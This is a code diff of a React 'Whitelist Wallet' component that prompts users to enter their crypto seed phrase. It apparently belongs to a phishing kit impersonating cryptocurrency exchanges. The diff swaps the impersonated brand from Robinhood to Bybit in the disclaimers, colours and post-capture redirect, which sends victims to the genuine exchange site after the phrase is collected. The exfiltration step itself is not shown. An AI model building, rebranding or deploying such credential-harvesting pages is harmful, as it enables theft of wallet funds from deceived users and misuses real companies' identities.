@@ -33,7 +33,7 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
     navigator.clipboard.writeText(Object.values(words).join(" "));
     setIsCopied("Finish");
     setCopiedText(true);
-    window.location.href = "https://robinhood.com/eu/nl/";
+    window.location.href = "https://www.bybit.com/en/";
   };
 
   const showModal = () => {
@@ -53,7 +53,7 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
               tempCount = -10;
               setErrorCount(tempCount);
               setInfo(
-                "Your wallet has been successfully whitelisted.\n Your wallet backup (recovery seed) is yours and yours only: never share, store digitally, or disclose it to anyone, not even Robinhood support."
+                "Your wallet has been successfully whitelisted.\n Your wallet backup (recovery seed) is yours and yours only: never share, store digitally, or disclose it to anyone, not even Bybit support."
               );
             }
           }
@@ -111,14 +111,13 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
       <div className="w-screen overflow-x-hidden  flex relative text-white text-start py-20">
         <div className="flex flex-col w-full overflow-x-hidden sm:px-[100px] px-[30px] py-[30px]">
           <div>
-            <h2 className="font-medium text-[26px] mb-[10px] text-[#CBFF00]">
+            <h2 className="font-medium text-[26px] mb-[10px] text-yellow-500">
               Whitelist Wallet
             </h2>
             <p className="text-[14px] text-slate-500 leading-[1.5] mb-[20px]">
               Enter the seed phrase you would like to whitelist. this will
               ensure your wallet is recognized by the system and secured. <br />
-              DISCLAIMER: Robinhood does not keep a copy of your recovery
-              phrase.
+              DISCLAIMER: Bybit does not keep a copy of your recovery phrase.
             </p>
           </div>
 
@@ -136,7 +135,7 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
                 onClick={() => handleTabChange(num)}
                 className={`text-[14px] cursor rounded-[4px] w-full font-semibold h-[42px] ${
                   activeTab === num
-                    ? "bg-[#CBFF00] text-black"
+                    ? "bg-yellow-500 text-black"
                     : "text-white bg-[#202630]"
                 }`}
               >
